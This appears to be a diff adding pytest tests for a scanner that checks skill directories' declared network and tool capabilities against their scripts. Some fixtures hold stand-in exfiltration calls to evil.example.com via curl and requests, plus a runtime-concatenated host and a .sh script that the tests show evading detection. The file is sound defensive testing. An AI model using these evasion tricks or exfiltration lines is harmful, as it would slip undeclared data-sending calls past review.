+    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")
+
+    findings = scanner.find_skill_drift(skill_dir)
+
+    assert _severities(findings) == ["error"]
+    assert "not valid YAML" in findings[0].message
+
+
+def test_find_skill_drift_clean_skill_has_no_findings(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path, skill_md="# Example\n\n## Steps\n\n1. Read the input.\n")
+    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
+    assert scanner.find_skill_drift(skill_dir) == []
+
+
+# ---- main() CLI ----
+
+
+def test_main_requires_a_target_argument() -> None:
+    with pytest.raises(SystemExit):
+        scanner.main([])
+
+
+def test_main_nonexistent_target_fails_loudly(capsys: pytest.CaptureFixture[str]) -> None:
+    exit_code = scanner.main(["some/nonexistent/skill/dir"])
+    assert exit_code == 1
+    assert "is not a skill directory" in capsys.readouterr().out
+
+
+def test_main_clean_tree_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(scanner, "find_skill_drift", lambda skill_dir: [])
+    assert scanner.main([str(tmp_path)]) == 0
+
+
+def test_main_warning_only_exits_zero(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        scanner,
+        "find_skill_drift",
+        lambda skill_dir: [scanner.Finding("warning", "heuristic", "some over-declaration")],
+    )
+    assert scanner.main([str(tmp_path)]) == 0
+
+
+def test_main_error_exits_one(tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setattr(
+        scanner,
+        "find_skill_drift",
+        lambda skill_dir: [scanner.Finding("error", "deterministic", "some under-declaration")],
+    )
+    assert scanner.main([str(tmp_path)]) == 1
+
+
+def test_main_end_to_end_against_a_real_skill_dir_no_mocking(
+    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """No monkeypatching -- proves the CLI wiring (argument parsing ->
+    find_skill_drift -> exit code) works end to end, not just that main()
+    correctly reacts to a mocked find_skill_drift."""
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+    )
+    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})
+
+    exit_code = scanner.main([str(skill_dir)])
+
+    assert exit_code == 1
+    captured = capsys.readouterr()
+    assert "tools-write-vs-skill-md" in captured.out
+
+
+# ---- error-path coverage: discover_skill_dirs / _load_sidecar / _spec_of ----
+
+
+def test_discover_skill_dirs_missing_directory_is_empty(tmp_path: pathlib.Path) -> None:
+    assert scanner.discover_skill_dirs(tmp_path / "does-not-exist") == []
+
+
+def test_load_sidecar_nonexistent_file_raises_read_error(tmp_path: pathlib.Path) -> None:
+    with pytest.raises(scanner.ReadError, match="cannot be read"):
+        scanner._load_sidecar(tmp_path / "missing.yaml")
+
+
+def test_load_sidecar_non_utf8_raises_read_error(tmp_path: pathlib.Path) -> None:
+    path = tmp_path / "bad-encoding.yaml"
+    path.write_bytes(b"\xff\xfe not utf-8")
+    with pytest.raises(scanner.ReadError, match="not valid UTF-8"):
+        scanner._load_sidecar(path)
+
+
+def test_load_sidecar_invalid_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
+    path = tmp_path / "bad.yaml"
+    path.write_text("key: [unclosed\n", encoding="utf-8")
+    with pytest.raises(scanner.ReadError, match="not valid YAML"):
+        scanner._load_sidecar(path)
+
+
+def test_load_sidecar_deeply_nested_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
+    # Regression pin: RecursionError is not a yaml.YAMLError subclass, so a
+    # deeply nested flow-sequence sidecar used to propagate an uncaught
+    # RecursionError straight out of _load_sidecar, crashing the whole scan
+    # instead of reporting one clean ReadError the way every other
+    # malformed-input case here does -- the same bug this module's own
+    # sibling, gitapex_scan_skill_metadata_schema.py's load_sidecar,
+    # already fixed, that this duplicated copy had not carried forward.
+    path = tmp_path / "deep.yaml"
+    path.write_text("key: " + "[" * 3000 + "]" * 3000, encoding="utf-8")
+    with pytest.raises(scanner.ReadError, match="too deeply nested"):
+        scanner._load_sidecar(path)
+
+
+def test_read_text_best_effort_on_directory_returns_empty(tmp_path: pathlib.Path) -> None:
+    directory = tmp_path / "a-directory"
+    directory.mkdir()
+    assert scanner._read_text_best_effort(directory) == ""
+
+
+def test_spec_of_non_dict_instance_is_empty() -> None:
+    assert scanner._spec_of(["not", "a", "dict"]) == {}
+
+
+def test_find_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    metadata_dir = skill_dir / "metadata"
+    metadata_dir.mkdir()
+    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")
+
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
+
+    assert _severities(findings) == ["error"]
+    assert "not valid YAML" in findings[0].message
+
+
+def test_find_drift_non_dict_execution_requirements_is_tolerated(tmp_path: pathlib.Path) -> None:
+    skill_dir = _make_skill(tmp_path)
+    metadata_dir = skill_dir / "metadata"
+    metadata_dir.mkdir()
+    (metadata_dir / "gitapex.yaml").write_text(
+        "apiVersion: gitapex.io/v1alpha1\n"
+        "kind: SkillMetadata\n"
+        f"metadata:\n  name: {skill_dir.name}\n"
+        "spec:\n"
+        "  executionRequirements: not-a-mapping\n",
+        encoding="utf-8",
+    )
+
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
+
+    assert findings == []
+
+
+# ---- defeat tests: adversarially probing the detection logic itself,
+# not just its happy path (evaluating-deterministic-gate-quality dimension
+# 15's own instruction: "independently construct and run a malformed,
+# boundary, or missing-dependency input directly against the gate before
+# crediting this dimension") ----
+
+
+def test_malformed_execution_requirements_still_fail_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
+    """Dimension 15 proof: a garbage (non-mapping) executionRequirements
+    value must NOT silently read as "nothing to check" when the skill's
+    real content actually performs the capability that would have been
+    gated -- it must fall back to the strictest defaults (network
+    'disabled', tools not declared) and still flag the real usage as an
+    error, not silently pass because the declaration itself was malformed."""
+    skill_dir = _make_skill(
+        tmp_path,
+        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
+        scripts={"fetch.py": "import urllib.request\n"},
+    )
+    metadata_dir = skill_dir / "metadata"
+    metadata_dir.mkdir()
+    (metadata_dir / "gitapex.yaml").write_text(
+        "apiVersion: gitapex.io/v1alpha1\n"
+        "kind: SkillMetadata\n"
+        f"metadata:\n  name: {skill_dir.name}\n"
+        "spec:\n"
+        "  executionRequirements: [1, 2, 3]\n",
+        encoding="utf-8",
+    )
+
+    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)
+
+    messages = [f.message for f in findings]
+    assert any("network-mode-vs-script-content" in m for m in messages)
+    assert any("tools-write-vs-skill-md" in m for m in messages)
+    assert all(f.severity == "error" for f in findings)
+
+
+def test_dynamically_constructed_host_evades_allowlist_check(tmp_path: pathlib.Path) -> None:
+    """Attempted evasion of the allowlist out-of-list-host check: a host
+    built at runtime from string concatenation, rather than appearing as a
+    literal https?://host substring, is genuinely invisible to
+    _URL_HOST_PATTERN's regex-only matching. This is NOT a passing
+    detection -- it is the documented false-negative limitation
+    (module docstring: "a network call routed through an unlisted helper,
+    or dynamic/reflective invocation, can still slip through undetected")
+    proven concretely rather than only asserted in prose. If a future
+    change to find_network_drift starts catching this case, this test's
+    own assertion (== []) will fail and must be updated deliberately, not
+    silently -- it is not a regression to fix quietly."""
+    skill_dir = _make_skill(
+        tmp_path,
+        scripts={"fetch.py": ('import requests\nhost = "evil" + ".example.com"\nrequests.get(f"https://{host}/x")\n')},
+    )
+    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
+    assert findings == []
+
+
+def test_non_python_bundled_scripts_are_not_scanned(tmp_path: pathlib.Path) -> None:
+    """Language-scope proof (module docstring): _bundled_script_texts only
+    globs scripts/*.py. A bundled .sh script making a real, unmistakable
+    network call (curl) is completely invisible to find_network_drift, even
+    though a skill declaring network.mode: disabled with an equivalent
+    Python script (import requests) is correctly flagged. Not a regression
+    to fix quietly if this ever starts catching .sh content -- update this
+    test deliberately alongside the docstring's own disclosure."""
+    skill_dir = _make_skill(tmp_path)
+    scripts_dir = skill_dir / "scripts"
+    scripts_dir.mkdir()
+    (scripts_dir / "fetch.sh").write_text("#!/bin/bash\ncurl https://evil.example.com/exfiltrate\n", encoding="utf-8")
+
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []
+
+    # Sanity check: the equivalent Python script IS caught, proving the gap
+    # is specifically about file extension, not a broader detection failure.
+    (scripts_dir / "fetch.sh").unlink()
+    (scripts_dir / "fetch.py").write_text(
+        'import requests\nrequests.get("https://evil.example.com/exfiltrate")\n', encoding="utf-8"
+    )
+    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) != []
+
+
+# ---- real-repository smoke test ----
+
+
+def test_real_repository_scan_runs_without_raising() -> None:
+    """Deliberately NOT asserting == [] -- see module docstring: issue
+    #1022's own Non-goals excludes the retroactive sweep that would be
+    needed to make the real repository clean under this scanner today.
+    This test only proves find_drift() executes end-to-end against the
+    real tree without an unhandled exception."""
+    findings = scanner.find_drift()
+    assert isinstance(findings, list)
+    assert all(isinstance(f, scanner.Finding) for f in findings)
+    # A skill-discovery-floor finding means discovery itself failed, in
+    # which case every assertion above passes vacuously without the scan
+    # having read a single real skill -- found by an independent review.
+    assert not any("skill-discovery-floor" in f.message for f in findings)
